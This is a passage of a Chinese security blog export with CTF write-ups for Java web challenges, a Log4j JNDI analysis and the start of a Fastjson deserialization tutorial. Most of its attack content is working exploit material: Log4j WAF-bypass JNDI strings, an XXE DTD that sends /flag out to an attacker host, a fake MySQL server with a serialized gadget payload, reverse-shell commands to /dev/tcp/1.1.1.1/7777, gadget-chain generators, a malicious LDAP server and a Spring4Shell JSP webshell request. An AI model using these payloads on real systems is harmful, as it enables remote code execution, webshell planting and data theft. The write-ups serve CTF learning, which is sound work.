这里有个关键的字符串提取，先判断字符串中是否有${的组合，之后会提取出${}之间的所有字符，我们跟进StrSubstitutor类的replace方法看一看： 之后会进入StrSubstitutor类的substitute方法（在307行）： 之后这个substitute方法接着调用311行的substitute方法，这里边经过一系列的判断之后，会提取出${}之间的所有字符的所有字符，并赋值给varName： 之后会进入resolveVariable方法： 这里的resolver通过getVariableResolver获取到了如下的值，可见不止有jndi，我们可以判断出这里提到的值都可以在以后利用： 可以发现该方法的具体流程中有lookup方法，不确定是不是我们需要的Jndi的lookup方法，跟进看一看： 可见这里还不是我们想要的Jndi的lookup方法，这里的是Interpolator类的lookup方法，它提取出来了:之前的值，即jndi，并获取JndiLookup类,最终在163行这里调用JndiLookup类的lookup方法： 之后便是一系列的Jndi注入的流程 至于为什么会触发两次，我调试看了看，大致是因为在加载的时候在命令行打印前会触发一遍，之后写入日志中还会触发一遍(这个我看了网上不少文章，但貌似师傅们都没有提到这一点) 4.Bypass网上很多的WAF都是基于对jndi关键字的过滤，因为在官方文档中有这么一句话： 如果USER这个环境变量未设置，就会使用默认值，而这肯定不是我们希望的，下面来看一看如何进行jndi关键字的绕过： 1)多${}绕过：123$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:7777/TestRef&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/TestRef&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/TestRef&#125; #绕过ldap的过滤 2)大小写绕过：因为前边在看resolver的时候看到了lower和upper，我们可以这样： 12$&#123;$&#123;lower:JN&#125;di:ldap://127.0.0.1:7777/TestRef&#125;$&#123;$&#123;upper:jn&#125;DI:ldap://127.0.0.1:7777/TestRef&#125; 大小写是无所谓的，因为在Interpolator类的lookup方法中会对截取到的字符全部小写化 3)特殊字符绕过：1$&#123;jnd$&#123;upper:ı&#125;:ldap://127.0.0.1:7777/TestRef&#125; 4)unicode绕过：emm，本地的环境反正没过，不知道有没有用，先记下来： 1$&#123;sys:\\u006fs.name&#125; 5)不出现端口号：注意此时需要ldap服务端口为389 12$&#123;jndi:ldap://127.0.0.1/TestRef&#125;$&#123;jndi:ldap://[127.0.0.1]/TestRef&#125; 小结先写到这里吧，之后学到什么新的东西再往上添","categories":[],"tags":[]},{"title":"NSSCTF靶场JAVA题全解（已完结）","slug":"NSSCTF靶场JAVA题全解","date":"2024-04-18T14:31:56.253Z","updated":"2024-08-24T12:33:41.034Z","comments":true,"path":"2024/04/18/NSSCTF靶场JAVA题全解/","link":"","permalink":"http://example.com/2024/04/18/NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/","excerpt":"作者：Narcher 时间：2024&#x2F;4&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;4&#x2F;18 分类：writeup [网鼎杯 2020青龙组]FileJava打开网址，发现存在文件上传功能，上传后还可以进行文件下载，我们就随便上传一个文件，然后下载抓包看看有什么可利用的东西： 猜测可能存在任意文件读取漏洞，我们修改filename的值： 随便一改就发现它自己报错把路径什么的全都爆出来了，我们尝试读取flag： 发现存在flag字符串便会导致禁止读取，那我们根据前边的报错找一下web.xml这种敏感文件（一般位于WEB-INF目录下）： 成功读取，之后把相关文件全都读取下载下来： 还有两个就不截图了，一样的，反正下载下来之后反编译查看源码开始分析就行了： 关键部分如上所示，看见try里边的代码就自然而然想到了CVE-2014-3529 下面我搭了个本地测试的环境，大致调试看了一下，关键的地方说一下： 首先，我们要利用这个漏洞，需要对xlsx文件解压缩，并修改其中的[Content_Types].xml文件，切记不能改文件名，因为执行过程前会有对这个文件的判断： 其次，xxe注入在这里触发： 对于题目而言也是一样的，我们直接先unzip一个xlsx文件，在[Content_Types].xml文件中的第二行添加（注：vps处填写自己的服务器公网IP和http服务开放的端口）： 1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http://vps/file.dtd&quot;&gt;%remote;%int;%send;]&gt; 然后在vps上挂一个file.dtd，并开启http服务，并nc监听7777端口，file.dtd内容如下： 12&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:7777?p=%file;&#x27;&gt;&quot;&gt; 把解压缩并修改后的文件重新压缩回xlsx文件，命令：zip -r xxe.xlsx * 并命名为如下格式： 之后上传就可以了： 成功获取flag [羊城杯 2020]a_piece_of_java把下载到的源码使用jar xvf xxx.jar命令反编译得到源码，在&#x2F;hello中发现反序列化触发点： 也就是说我们需要把序列化的数据放在http头的cookie中即可执行反序列化，但deserialize中还有一个过滤： 上述白名单只允许通过它自己规定的类和java.lang里的类，所以我们直接用ysoserialize中的链子是打不通的，继续看： 12345678910private void connect() &#123; String url = &quot;jdbc:mysql://&quot; + this.host + &quot;:&quot; + this.port + &quot;/jdbc?user=&quot; + this.username + &quot;&amp;password=&quot; + this.password + &quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;; try &#123; this.connection = DriverManager.getConnection(url); &#125; catch (Exception var3) &#123; var3.printStackTrace(); &#125;&#125; 在DatabaseInfo.class中可以看到如上代码，很明显就是让我们利用MYSQL JDBC反序列化这个漏洞，我们再去看看依赖包中的版本： 1mysql-connector-java-8.0.19.jar 既然是8.x版本，我们可以直接把相关的链子拿过来用： 1jdbc:mysql://x.x.x.x:3307/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 至于MYSQL服务器我们去copy一下大佬写好的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import socketimport binasciiimport osgreeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;response_ok_data=&quot;0700000200000002000000&quot;def receive_data(conn): data = conn.recv(1024) print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data)) return str(data).lower()def send_data(conn,data): print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data)) conn.send(binascii.a2b_hex(data))def get_payload_content(): #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload file= r&#x27;payload&#x27; if os.path.isfile(file): with open(file, &#x27;rb&#x27;) as f: payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;) print(&quot;open successs&quot;) else: print(&quot;open false&quot;) #calc payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27; return payload_contentdef run(): while 1: conn, addr = sk.accept() print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if &quot;session.auto_increment_increment&quot; in data: _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27; send_data(conn,_payload) data=receive_data(conn) elif &quot;show warnings&quot; in data: _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27; send_data(conn, _payload) data = receive_data(conn) if &quot;set names&quot; in data: send_data(conn, response_ok_data) data = receive_data(conn) if &quot;set character_set_results&quot; in data: send_data(conn, response_ok_data) data = receive_data(conn) if &quot;show session status&quot; in data: mysql_data = &#x27;0100000102&#x27; mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27; mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27; # 为什么我加了EOF Packet 就无法正常运行呢？？ # 获取payload payload_content=get_payload_content() # 计算payload长度 payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # 计算数据包长度 data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex mysql_data += str(payload_content) mysql_data += &#x27;07000005fe000022000100&#x27; send_data(conn, mysql_data) data = receive_data(conn) if &quot;show warnings&quot; in data: payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27; send_data(conn, payload) breakif __name__ == &#x27;__main__&#x27;: HOST =&#x27;0.0.0.0&#x27; PORT = 3307 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT)) run() 至于payload文件我们需要使用ysoserial生成，命令如下： 1java -jar ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,xxxxxxxxxxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; payload xxxxxxxxxxxxx处填写反弹shell命令的base64编码，例如：/bin/bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1的base64：L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvNzc3NyAwPiYx 而在题目中触发MYSQL JDBC的链子还是需要我们自己构造，我们从DatabaseInfo.class的connect()方法往上溯源，可以找到DatabaseInfo.class的checkAllInfo()方法，而checkAllInfo()方法被题目中重写的InfoInvocationHandler的调用： 那么我们的目标就很明确了，就是先给DatabaseInfo类的实例赋值为8.x版本的链子形式，之后将其赋值给InfoInvocationHandler类的实例中的info，并使用动态代理触发invoke()方法进而执行一系列反序列化流程，最终通过MYSQL JDBC获取到vps上的payload进而执行无过滤的反序列化将shell反弹到vps上即可，链子如下： 1234567891011121314151617181920212223242526272829import gdufs.challenge.web.model.*;import gdufs.challenge.web.invocation.InfoInvocationHandler;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class Test &#123; public static void main(String[] args) throws Exception&#123; DatabaseInfo databaseinfo=new DatabaseInfo(); databaseinfo.setHost(&quot;IP&quot;);//此处填写自己的vps公网IP databaseinfo.setPort(&quot;3307&quot;); databaseinfo.setUsername(&quot;1&quot;); databaseinfo.setPassword(&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;); InfoInvocationHandler infoInvocationHandler=new InfoInvocationHandler(databaseinfo); Info info=(Info)Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler); ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(info); objectOutputStream.close(); String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())); System.out.println(str); &#125;&#125; 之后python3 mysql.py开启mysql服务器，并nc监听接收反弹的端口，再访问&#x2F;hello，在cookie处填写上述脚本的链子： 去vps处查看获取shell，直接cat &#x2F;flag获取flag： （本题需要了解MYSQL JDBC反序列化相关知识点，当然只是简单的知道流程就能做题，但我还是从这里立一个FLAG吧，在复现完NSSCTF的所有Java题之后一定要抽空调试学习一下具体流程，这题的复现参考了很多大佬的博客，感觉还是需要不断学习才能提高自己） [HZNUCTF 2023 final]ezjava刚开始让这题坑了，一直dns探测不到，结果发现是校园网的问题，换了个网就好了 与此同时，貌似有个过滤，我用${java:os}读不到东西，并且貌似还有个时间限制，有时候dns能探测到，有时候探测不到，总之这题有点玄学，废话不多说了，直接开始： 看到log和fastjson就基本上明白这个题考什么了，大体思路就是用log4j的远程代码执行漏洞来触发jndi注入，在jndi注入中触发fastjson 1.2.48的反序列化漏洞 我们先dns探测一下： payload: 1$&#123;jndi:dns://$&#123;sys:java.version&#125;.tzey97.dnslog.cn&#125; 探测出jdk版本为8u222，大于8u191，因此不能直接jndi注入拿shell，这就需要hint的Fastjson 1.2.48的反序列化漏洞了。 大致思路为：利用LDAP直接返回一个恶意的序列化对象，JNDI注入对该序列化对象进行反序列化操作，利用反序列化来完成命令执行。那么这里我们就需要利用LDAP返回依赖Fastjson 1.2.48的序列化链 网上流传的都是1.2.83的通杀链，我这里也就直接拿过来了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import com.alibaba.fastjson.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Fastjson83 &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static byte[] genPayload(String cmd) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); &#125; public static void main(String[] args) throws Exception&#123; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;bash -c &#123;echo,&lt;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1的base64编码&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)&#125;);//这里需要更改 setValue(templates, &quot;_name&quot;, &quot;111&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,&quot;val&quot;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); byte[] serialize = byteArrayOutputStream.toByteArray(); System.out.println(Base64.getEncoder().encodeToString(serialize));// ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));// objectInputStream.readObject(); &#125;&#125; 将这个的输出填写到jndi高版本绕过的脚本中： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.URL;//高版本LDAP绕过public class LDAPServer &#123; private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;; public static void main ( String[] tmp_args ) throws Exception&#123; String[] args=new String[]&#123;&quot;http://localhost/#Evail&quot;&#125;; int port = 6666; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, //$NON-NLS-1$ InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); ds.startListening(); &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(&#x27;#&#x27;); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;&lt;上述脚本的输出&gt;&quot;)); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 之后将其打包成jar，上传到vps上边，直接运行的同时监听相应端口，然后在请求的url后添加如下图所示的payload即可： 1$&#123;jndi:ldap://1.1.1.1:6666/Evail&#125;&lt;此处需要更改vps地址&gt; 之后如图所示获取到shell [MTCTF 2022]easyjava这题听说在NSS上开起来的有问题，那就直接去https://github.com/CTF-Archives/2022-mtgxs-web-easyjava这里，把jar包下下来自己搭个本地环境打吧 反序列化入口点在这里，但要想进入这个路由得先经过下边的shiro认证： 其中，登录认证部分如下： 我们没有用户名密码，就只能考虑shiro的权限绕过了，本题的shiro版本为1.5.2，于是使用CVE-2020-11989 成功绕过，之后看一下反序列化的黑名单： emm，第一个黑名单感觉像是少了个. 不过无所谓，因为有commons-beanutils-1.9.4.jar依赖，直接CB链子打就完了 123456789101112131415161718192021222324252627282930313233343536373839404142434445import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class cb &#123; public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123; TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&quot;_name&quot;); nameField.setAccessible(true); nameField.set(templates,&quot;aaaa&quot;); Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates,codes); Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, new AttrCompare()); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class&lt;PriorityQueue&gt; c = PriorityQueue.class; Field comparatorField = c.getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue,beanComparator); //序列化 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;)); oos.writeObject(priorityQueue); //反序列化// ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\shiro_CB.txt&quot;));// ois.readObject(); &#125;&#125; 之后base64编码后打就完了，这里要特别注意一下环境的依赖版本配置，不一样的话可能会报错serialVersionUID的问题 [NUSTCTF 2022 新生赛]Ezjavaflag1 考查javabean的赋值操作，payload：/addUser1?department.name1=njust&amp;name=2022 flag2 考查CVE-2022-22965 Spring Framework 任意文件写入漏洞 post传参： 1class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25&#123;prefix&#125;ijava.io.InputStream+in+%3d+Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream()%3bint+a+%3d+-1%3bbyte[]+b+%3d+new+byte[4096]%3bout.print(&quot;&lt;/pre&gt;&quot;)%3bwhile((a%3din.read(b))!%3d-1)&#123;+out.println(new+String(b))%3b+&#125;out.print(&quot;&lt;/pre&gt;&quot;)%3b%25&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=./webapps/ROOT/&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=njust2022.njust&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= 其中的具体含义： 1234567class.module.classLoader.resources.context.parent.pipeline.first.pattern=rce_20220329 （写入shell内容） class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp（修改tomcat配置日志文件后缀jsp） class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT（写入shell在网站根目录） class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell（写入shell文件名称）&lt;br&gt;&lt;br&gt;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=（文件日期格式（实际构造为空值即可））","categories":[],"tags":[]},{"title":"JAVA安全:Fastjson反序列化","slug":"JAVA安全Fastjson反序列化","date":"2024-03-30T02:33:57.809Z","updated":"2024-08-26T12:32:16.231Z","comments":true,"path":"2024/03/30/JAVA安全Fastjson反序列化/","link":"","permalink":"http://example.com/2024/03/30/JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;31 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;31 分类：Vulnerability Analysis 前言听白日梦组长讲课茅塞顿开，下边记录一下学到的知识 1.使用方式Fastjson是一个开源的Java类库，可以通过序列化或反序列化，将Java对象转换成json字符串，或者将json字符串转换成Java对象。 使用方法大致如下： 12345678910111213141516171819202122232425262728293031323334public class User &#123; private String name; private int id; public User()&#123; System.out.println(&quot;无参构造&quot;); &#125; public User(String name, int id) &#123; System.out.println(&quot;有参构造&quot;); this.name = name; this.id = id; &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getId() &#123; System.out.println(&quot;getId&quot;); return id; &#125; public void setId(int id) &#123; System.out.println(&quot;setId&quot;); this.id = id; &#125;&#125; 首先定义一个类，然后传入json字符串进行解析： 123456String s = &quot;&#123;\\&quot;id\\&quot;:\\&quot;1\\&quot;,\\&quot;name\\&quot;:\\&quot;lily\\&quot;&#125;&quot;;JSONObject jsonObject = JSON.parseObject(s);System.out.println(jsonObject.get(&quot;name&quot;));// 输出:// lily 结果只会打印一个lily，而当我们指定解析的类型时，就会发送以下情况： 12345678910String s = &quot;&#123;\\&quot;id\\&quot;:\\&quot;1\\&quot;,\\&quot;name\\&quot;:\\&quot;lily\\&quot;&#125;&quot;;User user = JSON.parseObject(s,User.class);System.out.println(user.getName());// 输出:// 无参构造// setId// setName// getName// lily 可见在解析字符串的时候调用了构造器和set方法，我们还可以通过传参的方式使用@type控制解析的类型： 1234567891011String s = 